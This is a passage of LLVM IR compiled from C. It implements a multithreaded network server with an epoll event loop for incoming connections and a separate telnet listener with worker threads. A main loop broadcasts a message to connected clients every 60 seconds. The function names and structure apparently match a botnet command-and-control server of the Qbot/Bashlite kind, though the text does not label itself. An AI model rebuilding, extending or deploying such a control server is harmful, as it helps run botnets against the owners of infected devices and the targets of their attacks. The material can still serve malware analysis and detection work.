  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.111, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.112, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.113, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.114, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.115, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.20, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #9
  br label %74, !llvm.loop !19

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !20

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
